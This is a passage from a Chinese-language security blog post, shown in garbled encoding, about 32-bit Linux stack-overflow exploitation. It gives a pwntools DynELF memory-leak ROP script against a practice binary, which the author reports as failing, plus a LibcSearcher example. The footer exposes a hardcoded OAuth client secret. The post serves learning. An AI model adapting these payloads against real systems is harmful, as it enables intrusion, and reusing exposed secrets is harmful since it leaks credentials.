<li>ELFæ¨¡å—<br>ELFæ¨¡å—ç”¨äºè·å–ELFæ–‡ä»¶çš„ä¿¡æ¯ï¼Œé¦–å…ˆä½¿ç”¨ELF()è·å–è¿™ä¸ªæ–‡ä»¶çš„å¥æŸ„ï¼Œç„¶åä½¿ç”¨è¿™ä¸ªå¥æŸ„è°ƒç”¨å‡½æ•°ï¼Œå’ŒIOæ¨¡å—å¾ˆç›¸ä¼¼ã€‚<br>ä¸‹é¢æ¼”ç¤ºäº†ï¼šè·å–åŸºåœ°å€ã€è·å–å‡½æ•°åœ°å€ï¼ˆåŸºäºç¬¦å·ï¼‰ã€è·å–å‡½æ•°gotåœ°å€ã€è·å–å‡½æ•°pltåœ°å€<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt;&gt;&gt; e = ELF(&apos;/bin/cat&apos;)</span><br><span class="line">&gt; &gt;&gt;&gt; print hex(e.address)  # æ–‡ä»¶è£…è½½çš„åŸºåœ°å€</span><br><span class="line">&gt; 0x400000</span><br><span class="line">&gt; &gt;&gt;&gt; print hex(e.symbols[&apos;write&apos;]) # å‡½æ•°åœ°å€</span><br><span class="line">&gt; 0x401680</span><br><span class="line">&gt; &gt;&gt;&gt; print hex(e.got[&apos;write&apos;]) # GOTè¡¨çš„åœ°å€</span><br><span class="line">&gt; 0x60b070</span><br><span class="line">&gt; &gt;&gt;&gt; print hex(e.plt[&apos;write&apos;]) # PLTçš„åœ°å€</span><br><span class="line">&gt; 0x401680</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</blockquote>
<p>å¦‚æœæ— æ³•ç›´æ¥çŸ¥é“å¯¹æ–¹æ‰€ä½¿ç”¨çš„æ“ä½œç³»ç»ŸåŠlibcçš„ç‰ˆæœ¬è€Œè‹¦æ¼ï¼Œå¸¸è§„æ–¹æ³•å°±æ˜¯æŒ¨ä¸ªæŠŠå¸¸è§çš„Libc.soä»ç³»ç»Ÿé‡Œæ‹¿å‡ºæ¥ï¼Œä¸æ³„éœ²çš„åœ°å€å¯¹æ¯”ä¸€ä¸‹æœ€å12ä½ï¼Œä»è€Œè·å–ç‰ˆæœ¬<br>githubä¸Šé¢æœ‰ä¸ªåº“å¯ä»¥å‚è€ƒï¼š<br><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¸ºå·²æ³„éœ²çš„å®é™…åœ°å€,æˆ–æœ€å12ä½(æ¯”å¦‚ï¼šd90)ï¼Œintç±»å‹</span><br><span class="line">obj = LibcSearcher(&quot;fgets&quot;, 0X7ff39014bd90)</span><br><span class="line"></span><br><span class="line">obj.dump(&quot;system&quot;)        #system åç§»</span><br><span class="line">obj.dump(&quot;str_bin_sh&quot;)    #/bin/sh åç§»</span><br><span class="line">obj.dump(&quot;__libc_start_main_ret&quot;)</span><br></pre></td></tr></table></figure></p>
<hr>
<h1 id="0x05-Memory-Leak-amp-DynELF-åœ¨ä¸è·å–ç›®æ ‡libc-soçš„æƒ…å†µä¸‹è¿›è¡ŒROPæ”»å‡»"><a href="#0x05-Memory-Leak-amp-DynELF-åœ¨ä¸è·å–ç›®æ ‡libc-soçš„æƒ…å†µä¸‹è¿›è¡ŒROPæ”»å‡»" class="headerlink" title="0x05 Memory Leak &amp; DynELF - åœ¨ä¸è·å–ç›®æ ‡libc.soçš„æƒ…å†µä¸‹è¿›è¡ŒROPæ”»å‡»"></a>0x05 Memory Leak &amp; DynELF - åœ¨ä¸è·å–ç›®æ ‡libc.soçš„æƒ…å†µä¸‹è¿›è¡ŒROPæ”»å‡»</h1><p>å‚è€ƒçš„æ˜¯è’¸ç±³çš„expï¼Œä½†æ˜¯ç”¨çš„ä¸æ˜¯ä»–çš„ç¤ºä¾‹ç¨‹åºï¼Œè€Œæ˜¯ret2libc3ã€‚<br>ä»–çš„æ–¹æ³•æ˜¯é€šè¿‡write@pltæ³„éœ²å†…å­˜ï¼Œç„¶åå¯»æ‰¾systemå‡½æ•°ã€‚ç„¶åä½¿ç”¨read@pltå°†â€™/bin/shâ€™å†™å…¥.bssæ®µï¼Œç„¶åé€šè¿‡ppprç§»äº¤æ§åˆ¶æƒç»™system()<br>ret2libc3çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œæ²¡æœ‰writeå’Œreadï¼Œä¸è¿‡æ²¡æœ‰å…³ç³»ï¼Œä½¿ç”¨puts@pltå’Œgets@pltä¹Ÿå¯ä»¥å®ç°å˜›ï¼Œä½†æ˜¯éš¾å°±éš¾åœ¨ï¼Œè™½ç„¶puts@pltåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯å®ƒæœ‰ç€é‡åˆ°â€™\x00â€™å°±æˆªæ–­å¹¶åœ¨åé¢å¡«å……â€™\nâ€™çš„â€œå¥½â€ä¹ æƒ¯ï¼Œæ‰€ä»¥æ³„éœ²å‡ºæ¥çš„æ•°æ®è¿˜éœ€è¦å¤„ç†ã€‚å¯ä»¥å‚è€ƒä¸‹é¢è¿™ä¸¤ç¯‡ï¼š<br><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85129</a><br><a href="http://uprprc.club/2016/09/07/pwntools-dynelf.html" target="_blank" rel="noopener">http://uprprc.club/2016/09/07/pwntools-dynelf.html</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">plt_puts = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">plt_gets = elf.symbols[<span class="string">'gets'</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">'_start'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> i</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    content = <span class="string">''</span></span><br><span class="line">    x = p.recvuntil(<span class="string">'!?'</span>)</span><br><span class="line">    payload1 = <span class="string">'\x90'</span>*<span class="number">112</span> + p32(plt_puts) + p32(main) + p32(address)</span><br><span class="line">    p.sendline(payload1)</span><br><span class="line">    up = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">          c = p.recv(<span class="number">1</span>)</span><br><span class="line">          count += <span class="number">1</span></span><br><span class="line">          <span class="keyword">if</span> up == <span class="string">'\n'</span> <span class="keyword">and</span> c == <span class="string">'N'</span>:</span><br><span class="line">                 print((content).encode(<span class="string">'hex'</span>))</span><br><span class="line">                 content =content[:<span class="number">-1</span>]+<span class="string">'\x00'</span></span><br><span class="line">                 <span class="keyword">break</span></span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">                 content += c</span><br><span class="line">                 up = c</span><br><span class="line">    content = content[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># content = p.recvuntil('\nN',True)</span></span><br><span class="line">    <span class="comment"># print(content)</span></span><br><span class="line">    <span class="comment"># if not content:</span></span><br><span class="line">    <span class="comment">#     content = '\x00'</span></span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">    <span class="comment">#     content = content[:4]</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"%#x =&gt; %s"</span> %(address, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">d = DynELF(leak,elf = ELF(<span class="string">'./ret2libc3'</span>))</span><br><span class="line"></span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line">print(<span class="string">"system address = "</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span></span><br><span class="line">pr = <span class="number">0x0804841d</span></span><br><span class="line"></span><br><span class="line">payload2 = flat([<span class="string">'a'</span>*<span class="number">112</span>,plt_gets,pr,bss_addr,sytem_addr,main,bss_addr])</span><br><span class="line"></span><br><span class="line">print(<span class="string">"###sending payload2####"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>è¿™æ®µä»£ç åœ¨æ³„éœ²ç¬¬ä¸€ä¸ªæ•°æ®ä¹‹åå°±å¤±è´¥äº†ï¼Œæˆ‘è°ƒè¯•äº†å¥½ä¹…ï¼Œæœ€åæ‰æƒ³èµ·æ¥ï¼Œ<code>payload1 = &#39;\x90&#39;*112 + p32(plt_puts) + p32(main) + p32(address)</code>è¿™é‡Œå¦‚æœä½¿ç”¨çš„æ˜¯mainï¼Œé‚£ä¹ˆå †æ ˆå°±ä¼šä¸å¹³è¡¡ï¼Œå¯¼è‡´æº¢å‡ºç‚¹å˜åŒ–ï¼ˆå‚è§ä¹‹å‰ä»112å˜æˆ104ï¼‰ã€‚ä½†æ˜¯å¦‚æœæ”¹æˆè¿”å›åˆ°start_addrï¼Œæ³„éœ²çš„æ•°æ®å°±ä¼šæ›´å¤šï¼ˆè™½ç„¶è¿˜æ˜¯æ²¡æœ‰æˆåŠŸï¼‰ã€‚<br>ä¸€ä¸ªäº‹å®æ˜¯æ±‡ç¼–ç¨‹åºçš„å…¥å£æ˜¯_startï¼Œè€ŒCç¨‹åºçš„å…¥å£æ˜¯mainå‡½æ•°</p>
<blockquote>
<p>æ‰§è¡Œçš„æµç¨‹æ˜¯ï¼š<br>GCCå°†ä½ çš„ç¨‹åºåŒcrtbegin.o/crtend.o/gcrt1.oä¸€å—è¿›è¡Œç¼–è¯‘ã€‚å…¶å®ƒé»˜è®¤librariesä¼šè¢«é»˜è®¤åŠ¨æ€é“¾æ¥ã€‚å¯æ‰§è¡Œç¨‹åºçš„å¼€å§‹åœ°å€è¢«è®¾ç½®ä¸º_startã€‚<br>å†…æ ¸åŠ è½½å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä¸”å»ºç«‹æ­£æ–‡æ®µï¼Œæ•°æ®æ®µï¼Œbssæ®µå’Œå †æ ˆæ®µï¼Œç‰¹åˆ«çš„ï¼Œå†…æ ¸ä¸ºå‚æ•°å’Œç¯å¢ƒå˜é‡åˆ†é…é¡µé¢ï¼Œå¹¶ä¸”å°†æ‰€æœ‰å¿…è¦ä¿¡æ¯pushåˆ°å †æ ˆä¸Šã€‚<br>æ§åˆ¶æµç¨‹åˆ°äº†_startä¸Šé¢ã€‚_startä»å†…æ ¸å»ºç«‹çš„å †æ ˆä¸Šè·å–æ‰€æœ‰ä¿¡æ¯ï¼Œä¸º<strong>libc_start_mainå»ºç«‹å‚æ•°æ ˆï¼Œå¹¶ä¸”è°ƒç”¨</strong>libc_start_mainã€‚<br><strong>libc_start_mainåˆå§‹åŒ–ä¸€äº›å¿…è¦çš„ä¸œè¥¿ï¼Œç‰¹åˆ«æ˜¯C libraryï¼ˆæ¯”å¦‚malloc)çº¿ç¨‹ç¯å¢ƒå¹¶ä¸”è°ƒç”¨æˆ‘ä»¬çš„mainå‡½æ•°ã€‚<br>æˆ‘ä»¬çš„mainä¼šä»¥main(argv,argv)æ¥è¢«è°ƒç”¨ã€‚äº‹å®ä¸Šï¼Œè¿™é‡Œæœ‰æ„æ€çš„ä¸€ç‚¹æ˜¯mainå‡½æ•°çš„ç­¾åã€‚</strong>libc_start_mainè®¤ä¸ºmainçš„ç­¾åä¸ºmain(int, char , char )ï¼Œå¦‚æœä½ æ„Ÿåˆ°å¥½å¥‡ï¼Œå°è¯•æ‰§è¡Œä¸‹é¢çš„ç¨‹åºã€‚<br><a href="https://www.mi1k7ea.com/2019/03/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/03/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc/</a></p>
</blockquote>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>æ‚¨çš„æ”¯æŒå°†é¼“åŠ±æˆ‘ç»§ç»­åˆ›ä½œï¼</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>æ‰“èµ</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/Wechatpay.png" alt="Cool-Y å¾®ä¿¡æ”¯ä»˜">
        <p>å¾®ä¿¡æ”¯ä»˜</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/Alipay.png" alt="Cool-Y æ”¯ä»˜å®">
        <p>æ”¯ä»˜å®</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>æœ¬æ–‡ä½œè€…ï¼š</strong>
    Cool-Y
  </li>
  <li class="post-copyright-link">
    <strong>æœ¬æ–‡é“¾æ¥ï¼š</strong>
    <a href="https://cool-y.github.io/2019/07/16/linux-pwn-32/" title="Linux Pwn-ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨">https://cool-y.github.io/2019/07/16/linux-pwn-32/</a>
  </li>
  <li class="post-copyright-license">
    <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>
    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/linux/" rel="tag"># linux</a>
          
            <a href="/tags/pwn/" rel="tag"># pwn</a>
          
            <a href="/tags/æ ˆæº¢å‡º/" rel="tag"># æ ˆæº¢å‡º</a>
          
        </div>
      

      
      
        <div class="post-widgets">
        

        

        
          
          <div id="needsharebutton-postbottom">
            <span class="btn">
              <i class="fa fa-share-alt" aria-hidden="true"></i>
            </span>
          </div>
        
        </div>
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/07/10/x86basic/" rel="next" title="x86-basic æ¼æ´åˆ©ç”¨">
                <i class="fa fa-chevron-left"></i> x86-basic æ¼æ´åˆ©ç”¨
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/07/24/web-dvwa/" rel="prev" title="DVWAé»‘å®¢æ”»é˜²å¹³å°">
                DVWAé»‘å®¢æ”»é˜²å¹³å° <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
      <div class="comments" id="comments">
          <div id="gitalk-container"></div>
      </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            æ–‡ç« ç›®å½•
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            ç«™ç‚¹æ¦‚è§ˆ
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="Cool-Y">
            
              <p class="site-author-name" itemprop="name">Cool-Y</p>
              <p class="site-description motion-element" itemprop="description">Juice is temporary but Sauce is forever</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">30</span>
                  <span class="site-state-item-name">æ—¥å¿—</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">åˆ†ç±»</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">55</span>
                  <span class="site-state-item-name">æ ‡ç­¾</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Cool-Y" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:cool.yim@whu.edu.cn" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.instagram.com/yan__han/" target="_blank" title="Instagram">
                      
                        <i class="fa fa-fw fa-instagram"></i>Instagram</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="/atom.xml" target="_blank" title="RSS">
                      
                        <i class="fa fa-fw fa-fas fa-rss"></i>RSS</a>
                  </span>
                
            </div>
          

          <div id="music163player">
                <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="110" src="//music.163.com/outchain/player?type=4&id=334277093&auto=1&height=90"></iframe>
          </div>


          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-Control-Flow-hijack"><span class="nav-text">0x00 Control Flow hijack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#å¯»æ‰¾å±é™©å‡½æ•°"><span class="nav-text">å¯»æ‰¾å±é™©å‡½æ•°</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#è®¡ç®—æº¢å‡ºç‚¹çš„ä½ç½®"><span class="nav-text">è®¡ç®—æº¢å‡ºç‚¹çš„ä½ç½®</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#åŠ«æŒretçš„åœ°å€"><span class="nav-text">åŠ«æŒretçš„åœ°å€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwnæµ‹è¯•"><span class="nav-text">pwnæµ‹è¯•</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0X01-ret2shellcode"><span class="nav-text">0X01 ret2shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#åŸç†"><span class="nav-text">åŸç†</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#æ£€æŸ¥ä¿æŠ¤æƒ…å†µ"><span class="nav-text">æ£€æŸ¥ä¿æŠ¤æƒ…å†µ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#æŸ¥çœ‹å±é™©å‡½æ•°"><span class="nav-text">æŸ¥çœ‹å±é™©å‡½æ•°</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#è®¡ç®—æº¢å‡ºç‚¹"><span class="nav-text">è®¡ç®—æº¢å‡ºç‚¹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#åŠ«æŒretçš„åœ°å€-1"><span class="nav-text">åŠ«æŒretçš„åœ°å€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwnæµ‹è¯•-1"><span class="nav-text">pwnæµ‹è¯•</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-ret2text"><span class="nav-text">0x02 ret2text</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#åŸç†-1"><span class="nav-text">åŸç†</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#æ£€æŸ¥ä¿æŠ¤"><span class="nav-text">æ£€æŸ¥ä¿æŠ¤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#æ£€æŸ¥å±é™©å‡½æ•°"><span class="nav-text">æ£€æŸ¥å±é™©å‡½æ•°</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#è®¡ç®—åç§»"><span class="nav-text">è®¡ç®—åç§»</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#å¯»æ‰¾è·³æ¿"><span class="nav-text">å¯»æ‰¾è·³æ¿</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#æµ‹è¯•"><span class="nav-text">æµ‹è¯•</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-ret2syscall"><span class="nav-text">0x03 ret2syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#åŸç†-2"><span class="nav-text">åŸç†</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#è·å–è·³æ¿"><span class="nav-text">è·å–è·³æ¿</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#æµ‹è¯•-1"><span class="nav-text">æµ‹è¯•</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-ret2libc"><span class="nav-text">0x04 ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#åŸç†-3"><span class="nav-text">åŸç†</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-ç¨‹åºä¸­æœ‰systemå’Œâ€™-bin-shâ€™"><span class="nav-text">1. ç¨‹åºä¸­æœ‰systemå’Œâ€™/bin/shâ€™</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#æ£€æŸ¥ä¿æŠ¤-1"><span class="nav-text">æ£€æŸ¥ä¿æŠ¤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ç¡®å®šæ¼æ´ä½ç½®"><span class="nav-text">ç¡®å®šæ¼æ´ä½ç½®</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#è®¡ç®—åç§»-1"><span class="nav-text">è®¡ç®—åç§»</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#å¯»æ‰¾è·³æ¿-1"><span class="nav-text">å¯»æ‰¾è·³æ¿</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwnæµ‹è¯•-2"><span class="nav-text">pwnæµ‹è¯•</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-æ²¡æœ‰binsh"><span class="nav-text">2. æ²¡æœ‰binsh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-ä¸¤ä¸ªéƒ½æ²¡æœ‰-amp-æ— ASLR"><span class="nav-text">3. ä¸¤ä¸ªéƒ½æ²¡æœ‰&amp;æ— ASLR</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#å¯»æ‰¾è·³æ¿-2"><span class="nav-text">å¯»æ‰¾è·³æ¿</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#æµ‹è¯•-2"><span class="nav-text">æµ‹è¯•</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-ä¸¤ä¸ªéƒ½æ²¡æœ‰-amp-æœ‰ASLR"><span class="nav-text">4. ä¸¤ä¸ªéƒ½æ²¡æœ‰&amp;æœ‰ASLR</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwnæµ‹è¯•-3"><span class="nav-text">pwnæµ‹è¯•</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-Memory-Leak-amp-DynELF-åœ¨ä¸è·å–ç›®æ ‡libc-soçš„æƒ…å†µä¸‹è¿›è¡ŒROPæ”»å‡»"><span class="nav-text">0x05 Memory Leak &amp; DynELF - åœ¨ä¸è·å–ç›®æ ‡libc.soçš„æƒ…å†µä¸‹è¿›è¡ŒROPæ”»å‡»</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2019 &mdash; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Cool-Y</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
    <span title="Site words total count">104.4k</span>
  
</div>


  <div class="powered-by">ç”± <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> å¼ºåŠ›é©±åŠ¨</div>








        
<div class="busuanzi-count">
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    
      <div id="needsharebutton-float">
        <span class="btn">
          <i class="fa fa-share-alt" aria-hidden="true"></i>
        </span>
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  













<!-- LOCAL: You can save these files to your site and update links -->
  
  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
<!-- END LOCAL -->

    
      <script type="text/javascript">
      function renderGitalk(){
        var gitalk = new Gitalk({
            owner: 'Cool-Y',
            repo: 'gitment-comments',
            clientID: '180955a2c3ae3d966d9a',
            clientSecret: '1c5db4da72df5e6fc318d12afe5f4406f7c54343',
            admin: 'Cool-Y',
            id: decodeURI(location.pathname),
            
              distractionFreeMode: 'true'
            
            });
        gitalk.render('gitalk-container');
      }
      renderGitalk();
      </script>
    





  





  

  
